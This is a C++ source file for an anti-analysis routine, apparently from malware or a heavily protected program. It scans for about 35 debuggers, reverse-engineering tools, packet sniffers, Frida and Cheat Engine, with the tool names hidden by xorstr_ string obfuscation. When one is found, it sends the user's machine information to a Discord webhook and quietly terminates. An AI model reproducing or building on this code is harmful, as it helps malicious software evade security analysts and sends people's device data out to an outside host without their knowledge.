#include "FindProcess.hpp"

bool Process::CheckProcess()
{
	const char* szProcesses[] = {
        xorstr_("ollydbg.exe"), xorstr_("ProcessHacker.exe"), xorstr_("tcpview.exe"), xorstr_("autoruns.exe"),
        xorstr_("autorunsc.exe"), xorstr_("filemon.exe"), xorstr_("procmon.exe"), xorstr_("regmon.exe"),
        xorstr_("procexp.exe"), xorstr_("idaq.exe"), xorstr_("idaq64.exe"), xorstr_("ImmunityDebugger.exe"),
        xorstr_("Wireshark.exe"), xorstr_("dumpcap.exe"), xorstr_("HookExplorer.exe"), xorstr_("ImportREC.exe"),
        xorstr_("PETools.exe"), xorstr_("LordPE.exe"), xorstr_("SysInspector.exe"), xorstr_("proc_analyzer.exe"),
        xorstr_("sysAnalyzer.exe"), xorstr_("sniff_hit.exe"), xorstr_("windbg.exe"), xorstr_("joeboxcontrol.exe"),
        xorstr_("joeboxserver.exe"), xorstr_("ResourceHacker.exe"), xorstr_("x32dbg.exe"), xorstr_("x64dbg.exe"),
        xorstr_("Fiddler.exe"), xorstr_("httpdebugger.exe"), xorstr_("cheatengine-i386.exe"),
        xorstr_("cheatengine-x86_64.exe"), xorstr_("cheatengine-x86_64-SSE4-AVX2.exe"),
        xorstr_("frida-helper-32.exe"), xorstr_("frida-helper-64.exe")
	};

	bool foundProcess = false;
	std::string process;

    for (const char* name : szProcesses)
    {
        DWORD pid = Shared::GetProcessIdFromName(name);
        if (pid != 0)
        {
            foundProcess = true;
            process += name;
            process += "\n";
        }
    }

    if (foundProcess)
    {
        Discord discord(Config::webhook_url);

        std::string title = xorstr_("Debugger Detection");
        std::string description = xorstr_("An analysis tool has been detected running on the user's device");
        std::string color = xorstr_("16711680");

        std::vector<std::pair<std::string, std::string>> fields;
        std::istringstream iss(process);
        std::string line;

        while (std::getline(iss, line))
        {
            fields.push_back({ xorstr_("Tools:"), line });
        }

        fields.push_back({ xorstr_("User Information:"), Shared::GetUserInformation() });

        discord.SendDiscord(title, description, color, fields);

        ExitProcess(0);
    }

    return foundProcess;
}
